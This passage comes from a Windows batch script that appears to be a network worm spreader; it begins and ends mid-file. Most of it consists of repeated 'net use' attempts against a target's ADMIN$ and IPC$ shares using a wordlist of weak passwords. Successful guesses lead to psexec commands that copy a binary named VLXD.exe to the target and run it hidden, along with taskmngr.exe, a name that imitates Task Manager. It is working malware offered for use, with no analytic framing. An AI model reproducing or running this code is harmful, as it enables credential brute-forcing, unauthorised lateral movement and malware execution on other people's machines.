   net use \\%1\ADMIN$ "joint" /user:root
   if not errorlevel 1 goto rootjoint
   net use \\%1\IPC$ "joint" /user:root
   if not errorlevel 1 goto rootjoint
   net use \\%1\ADMIN$ "crack" /user:root
   if not errorlevel 1 goto rootcrack
   net use \\%1\IPC$ "crack" /user:root
   if not errorlevel 1 goto rootcrack
   net use \\%1\ADMIN$ "danger" /user:root
   if not errorlevel 1 goto rootdanger
   net use \\%1\IPC$ "danger" /user:root
   if not errorlevel 1 goto rootdanger
   net use \\%1\ADMIN$ "weiner" /user:root
   if not errorlevel 1 goto rootweiner
   net use \\%1\IPC$ "weiner" /user:root
   if not errorlevel 1 goto rootweiner
   net use \\%1\ADMIN$ "electrical" /user:root
   if not errorlevel 1 goto rootelectrical
   net use \\%1\IPC$ "electrical" /user:root
   if not errorlevel 1 goto rootelectrical
   net use \\%1\ADMIN$ "electric" /user:root
   if not errorlevel 1 goto rootelectric
   net use \\%1\IPC$ "electric" /user:root
   if not errorlevel 1 goto rootelectric
   net use \\%1\ADMIN$ "electricity" /user:root
   if not errorlevel 1 goto rootelectricity
   net use \\%1\IPC$ "electricity" /user:root
   if not errorlevel 1 goto rootelectricity
   net use \\%1\ADMIN$ "penis" /user:root
   if not errorlevel 1 goto rootpenis
   net use \\%1\IPC$ "penis" /user:root
   if not errorlevel 1 goto rootpenis
   net use \\%1\ADMIN$ "cent" /user:root
   if not errorlevel 1 goto rootcent
   net use \\%1\IPC$ "cent" /user:root
   if not errorlevel 1 goto rootcent
   net use \\%1\ADMIN$ "50cent" /user:root
   if not errorlevel 1 goto root50cent
   net use \\%1\IPC$ "50cent" /user:root
   if not errorlevel 1 goto root50cent
   net use \\%1\ADMIN$ "eminem" /user:root
   if not errorlevel 1 goto rooteminem
   net use \\%1\IPC$ "eminem" /user:root
   if not errorlevel 1 goto rooteminem
   net use \\%1\ADMIN$ "vagina" /user:root
   if not errorlevel 1 goto rootvagina
   net use \\%1\IPC$ "vagina" /user:root
   if not errorlevel 1 goto rootvagina
   net use \\%1\ADMIN$ "cunt" /user:root
   if not errorlevel 1 goto rootcunt
   net use \\%1\IPC$ "cunt" /user:root
   if not errorlevel 1 goto rootcunt
   net use \\%1\ADMIN$ "pussy" /user:root
   if not errorlevel 1 goto rootpussy
   net use \\%1\IPC$ "pussy" /user:root
   if not errorlevel 1 goto rootpussy
   net use \\%1\ADMIN$ "cock" /user:root
   if not errorlevel 1 goto rootcock
   net use \\%1\IPC$ "cock" /user:root
   if not errorlevel 1 goto rootcock
   net use \\%1\ADMIN$ "dick" /user:root
   if not errorlevel 1 goto rootdick
   net use \\%1\IPC$ "dick" /user:root
   if not errorlevel 1 goto rootdick
   net use \\%1\ADMIN$ "shithead" /user:root
   if not errorlevel 1 goto rootshithead
   net use \\%1\IPC$ "shithead" /user:root
   if not errorlevel 1 goto rootshithead
   net use \\%1\ADMIN$ "blunt" /user:root
   if not errorlevel 1 goto rootblunt
   net use \\%1\IPC$ "blunt" /user:root
   if not errorlevel 1 goto rootblunt
   net use \\%1\ADMIN$ "shotgun" /user:root
   if not errorlevel 1 goto rootshotgun
   net use \\%1\IPC$ "shotgun" /user:root
   if not errorlevel 1 goto rootshotgun
   net use \\%1\ADMIN$ "glock" /user:root
   if not errorlevel 1 goto rootglock
   net use \\%1\IPC$ "glock" /user:root
   if not errorlevel 1 goto rootglock
   net use \\%1\ADMIN$ "executable" /user:root
   if not errorlevel 1 goto rootexecutable
   net use \\%1\IPC$ "executable" /user:root
   if not errorlevel 1 goto rootexecutable
   net use \\%1\ADMIN$ "bong" /user:root
   if not errorlevel 1 goto rootbong
   net use \\%1\IPC$ "bong" /user:root
   if not errorlevel 1 goto rootbong
   net use \\%1\ADMIN$ "dildo" /user:root
   if not errorlevel 1 goto rootdildo
   net use \\%1\IPC$ "dildo" /user:root
   if not errorlevel 1 goto rootdildo
   net use \\%1\ADMIN$ "baseball" /user:root
   if not errorlevel 1 goto rootbaseball
   net use \\%1\IPC$ "baseball" /user:root
   if not errorlevel 1 goto rootbaseball
   net use \\%1\ADMIN$ "basketball" /user:root
   if not errorlevel 1 goto rootbasketball
   net use \\%1\IPC$ "basketball" /user:root
   if not errorlevel 1 goto rootbasketball
   net use \\%1\ADMIN$ "football" /user:root
   if not errorlevel 1 goto rootfootball
   net use \\%1\IPC$ "football" /user:root
   if not errorlevel 1 goto rootfootball
   net use \\%1\ADMIN$ "soccer" /user:root
   if not errorlevel 1 goto rootsoccer
   net use \\%1\IPC$ "soccer" /user:root
   if not errorlevel 1 goto rootsoccer
   net use \\%1\ADMIN$ "pot" /user:root
   if not errorlevel 1 goto rootpot
   net use \\%1\IPC$ "pot" /user:root
   if not errorlevel 1 goto rootpot
   net use \\%1\ADMIN$ "dope" /user:root
   if not errorlevel 1 goto rootdope
   net use \\%1\IPC$ "dope" /user:root
   if not errorlevel 1 goto rootdope
   net use \\%1\ADMIN$ "maryjane" /user:root
   if not errorlevel 1 goto rootmaryjane
   net use \\%1\IPC$ "maryjane" /user:root
   if not errorlevel 1 goto rootmaryjane
   net use \\%1\ADMIN$ "marijuana" /user:root
   if not errorlevel 1 goto rootmarijuana
   net use \\%1\IPC$ "marijuana" /user:root
   if not errorlevel 1 goto rootmarijuana
   net use \\%1\ADMIN$ "money" /user:root
   if not errorlevel 1 goto rootmoney
   net use \\%1\IPC$ "money" /user:root
   if not errorlevel 1 goto rootmoney
   net use \\%1\ADMIN$ "girl" /user:root
   if not errorlevel 1 goto rootgirl
   net use \\%1\IPC$ "girl" /user:root
   if not errorlevel 1 goto rootgirl
   net use \\%1\ADMIN$ "girls" /user:root
   if not errorlevel 1 goto rootgirls
   net use \\%1\IPC$ "girls" /user:root
   if not errorlevel 1 goto rootgirls
   net use \\%1\ADMIN$ "woman" /user:root
   if not errorlevel 1 goto rootwoman
   net use \\%1\IPC$ "woman" /user:root
   if not errorlevel 1 goto rootwoman
   net use \\%1\ADMIN$ "women" /user:root
   if not errorlevel 1 goto rootwomen
   net use \\%1\IPC$ "women" /user:root
   if not errorlevel 1 goto rootwomen
   net use \\%1\ADMIN$ "female" /user:root
   if not errorlevel 1 goto rootfemale
   net use \\%1\IPC$ "female" /user:root
   if not errorlevel 1 goto rootfemale
   net use \\%1\ADMIN$ "america" /user:root
   if not errorlevel 1 goto rootamerica
   net use \\%1\IPC$ "america" /user:root
   if not errorlevel 1 goto rootamerica
   net use \\%1\ADMIN$ "usa" /user:root
   if not errorlevel 1 goto rootusa
   net use \\%1\IPC$ "usa" /user:root
   if not errorlevel 1 goto rootusa
   net use \\%1\ADMIN$ "god" /user:root
   if not errorlevel 1 goto rootgod
   net use \\%1\IPC$ "god" /user:root
   if not errorlevel 1 goto rootgod
   net use \\%1\ADMIN$ "jesus" /user:root
   if not errorlevel 1 goto rootjesus
   net use \\%1\IPC$ "jesus" /user:root
   if not errorlevel 1 goto rootjesus
   net use \\%1\ADMIN$ "technology" /user:root
   if not errorlevel 1 goto roottechnology
   net use \\%1\IPC$ "technology" /user:root
   if not errorlevel 1 goto roottechnology
   net use \\%1\ADMIN$ "computer" /user:root
   if not errorlevel 1 goto rootcomputer
   net use \\%1\IPC$ "computer" /user:root
   if not errorlevel 1 goto rootcomputer
   net use \\%1\ADMIN$ "porn" /user:root
   if not errorlevel 1 goto rootporn
   net use \\%1\IPC$ "porn" /user:root
   if not errorlevel 1 goto rootporn
   net use \\%1\ADMIN$ "clock" /user:root
   if not errorlevel 1 goto rootclock
   net use \\%1\IPC$ "clock" /user:root
   if not errorlevel 1 goto rootclock
   net use \\%1\ADMIN$ "church" /user:root
   if not errorlevel 1 goto rootchurch
   net use \\%1\IPC$ "church" /user:root
   if not errorlevel 1 goto rootchurch
   net use \\%1\ADMIN$ "church" /user:root
   if not errorlevel 1 goto rootchurch
   net use \\%1\IPC$ "church" /user:root
   if not errorlevel 1 goto rootchurch
   net use \\%1\ADMIN$ "temp" /user:root
   if not errorlevel 1 goto roottemp
   net use \\%1\IPC$ "temp" /user:root
   if not errorlevel 1 goto roottemp
   goto end
   :Administrator
   psexec \\%1 -u Administrator -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "" -d taskmngr.exe
   goto end
   :administratorpass123
   psexec \\%1 -u Administrator -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pass123" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pass123" -d taskmngr.exe
   goto end
   :administratorsomething
   psexec \\%1 -u Administrator -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "something" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "something" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "something" -d taskmngr.exe
   goto end
   :Administratormypass
   psexec \\%1 -u Administrator -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "mypass" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "mypass" -d taskmngr.exe
   goto end
   :Administratorlogin
   psexec \\%1 -u Administrator -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "login" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "login" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "login" -d taskmngr.exe
   goto end
   :Administratoraccess
   psexec \\%1 -u Administrator -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "access" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "access" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "access" -d taskmngr.exe
   goto end
   :Administratorpassword
   psexec \\%1 -u Administrator -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "password" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "password" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "password" -d taskmngr.exe
   goto end
   :Administratormatrix
   psexec \\%1 -u Administrator -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "matrix" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "matrix" -d taskmngr.exe
   goto end
   :Administratorsecurity
   psexec \\%1 -u Administrator -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "security" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "security" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "security" -d taskmngr.exe
   goto end
   :Administratorsuccess
   psexec \\%1 -u Administrator -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "success" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "success" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "success" -d taskmngr.exe
   goto end
   :Administratorspecial
   psexec \\%1 -u Administrator -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "special" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "special" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "special" -d taskmngr.exe
   goto end
   :Administratorultra
   psexec \\%1 -u Administrator -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "ultra" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "ultra" -d taskmngr.exe
   goto end
   :Administratorpass
   psexec \\%1 -u Administrator -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pass" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "pass" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pass" -d taskmngr.exe
   goto end
   :Administratorenable
   psexec \\%1 -u Administrator -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "enable" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "enable" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "enable" -d taskmngr.exe
   goto end
   :Administratorpasswd
   psexec \\%1 -u Administrator -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "passwd" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "passwd" -d taskmngr.exe
   goto end
   :Administratorinternet
   psexec \\%1 -u Administrator -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "internet" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "internet" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "internet" -d taskmngr.exe
   goto end
   :Administratornetwork
   psexec \\%1 -u Administrator -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "network" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "network" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "network" -d taskmngr.exe
   goto end
   :Administratoredu
   psexec \\%1 -u Administrator -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "edu" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "edu" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "edu" -d taskmngr.exe
   goto end
   :Administratorowner
   psexec \\%1 -u Administrator -p "owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "owner" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "owner" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "owner" -d taskmngr.exe
   goto end
   :Administratorlocal
   psexec \\%1 -u Administrator -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "local" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "local" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "local" -d taskmngr.exe
   goto end
   :Administratorremote
   psexec \\%1 -u Administrator -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "remote" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "remote" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "remote" -d taskmngr.exe
   goto end
   :Administratorlan
   psexec \\%1 -u Administrator -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "lan" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "lan" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "lan" -d taskmngr.exe
   goto end
   :Administratorroot
   psexec \\%1 -u Administrator -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "root" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "root" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "root" -d taskmngr.exe
   goto end
   :Administratorbitch
   psexec \\%1 -u Administrator -p "bitch" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bitch" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bitch" -d taskmngr.exe
   goto end
   :Administratorfault
   psexec \\%1 -u Administrator -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "fault" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "fault" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "fault" -d taskmngr.exe
   goto end
   :Administratorcat
   psexec \\%1 -u Administrator -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cat" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "cat" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cat" -d taskmngr.exe
   goto end
   :Administrator911
   psexec \\%1 -u Administrator -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "911" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "911" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "911" -d taskmngr.exe
   goto end
   :Administratortowers
   psexec \\%1 -u Administrator -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "towers" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "towers" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "towers" -d taskmngr.exe
   goto end
   :Administrator123
   psexec \\%1 -u Administrator -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "123" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "123" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "123" -d taskmngr.exe
   goto end
   :Administrator1234
   psexec \\%1 -u Administrator -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "1234" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "1234" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "1234" -d taskmngr.exe
   goto end
   :Administrator12345
   psexec \\%1 -u Administrator -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "12345" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "12345" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "12345" -d taskmngr.exe
   goto end
   :Administrator123456
   psexec \\%1 -u Administrator -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "123456" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "123456" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "123456" -d taskmngr.exe
   goto end
   :Administrator654321
   psexec \\%1 -u Administrator -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "654321" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "654321" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "654321" -d taskmngr.exe
   goto end
   :Administrator54321
   psexec \\%1 -u Administrator -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "54321" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "54321" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "54321" -d taskmngr.exe
   goto end
   :Administrator321
   psexec \\%1 -u Administrator -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "321" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "321" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "321" -d taskmngr.exe
   goto end
   :Administratorstudent
   psexec \\%1 -u Administrator -p "student" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "student" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "student" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "student" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "student" -d taskmngr.exe
   goto end
   :Administrator4321
   psexec \\%1 -u Administrator -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "4321" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "4321" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "4321" -d taskmngr.exe
   goto end
   :Administratortemp
   psexec \\%1 -u Administrator -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "temp" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "temp" -d taskmngr.exe
   goto end
   :Administratoruser
   psexec \\%1 -u Administrator -p "user" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "user" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "user" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "user" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "user" -d taskmngr.exe
   goto end
   :Administratorbootie
   psexec \\%1 -u Administrator -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bootie" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bootie" -d taskmngr.exe
   goto end
   :Administratorpoop
   psexec \\%1 -u Administrator -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "poop" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "poop" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "poop" -d taskmngr.exe
   goto end
   :Administratorpoopie
   psexec \\%1 -u Administrator -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "poopie" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "poopie" -d taskmngr.exe
   goto end
   :Administratorweed
   psexec \\%1 -u Administrator -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "weed" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "weed" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "weed" -d taskmngr.exe
   goto end
   :Administratorwater
   psexec \\%1 -u Administrator -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "water" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "water" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "water" -d taskmngr.exe
   goto end
   :Administratorcool
   psexec \\%1 -u Administrator -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cool" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "cool" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cool" -d taskmngr.exe
   goto end
   :Administratorjoint
   psexec \\%1 -u Administrator -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "joint" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "joint" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "joint" -d taskmngr.exe
   goto end
   :Administratorcrack
   psexec \\%1 -u Administrator -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "crack" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "crack" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "crack" -d taskmngr.exe
   goto end
   :Administratordanger
   psexec \\%1 -u Administrator -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "danger" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "danger" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "danger" -d taskmngr.exe
   goto end
   :Administratorweiner
   psexec \\%1 -u Administrator -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "weiner" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "weiner" -d taskmngr.exe
   goto end
   :Administratorelectrical
   psexec \\%1 -u Administrator -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electrical" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electrical" -d taskmngr.exe
   goto end
   :Administratorelectric
   psexec \\%1 -u Administrator -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electric" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "electric" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electric" -d taskmngr.exe
   goto end
   :Administratorelectricity
   psexec \\%1 -u Administrator -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electricity" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "electricity" -d taskmngr.exe
   goto end
   :Administratorpenis
   psexec \\%1 -u Administrator -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "penis" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "penis" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "penis" -d taskmngr.exe
   goto end
   :Administratorcent
   psexec \\%1 -u Administrator -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cent" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "cent" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cent" -d taskmngr.exe
   goto end
   :Administrator50cent
   psexec \\%1 -u Administrator -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "50cent" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "50cent" -d taskmngr.exe
   goto end
   :Administratoreminem
   psexec \\%1 -u Administrator -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "eminem" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "eminem" -d taskmngr.exe
   goto end
   :Administratorvagina
   psexec \\%1 -u Administrator -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "vagina" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "vagina" -d taskmngr.exe
   goto end
   :Administratorcunt
   psexec \\%1 -u Administrator -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cunt" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cunt" -d taskmngr.exe
   goto end
   :Administratorpussy
   psexec \\%1 -u Administrator -p "pussy" -d attrib.exe -r VLXD.exe
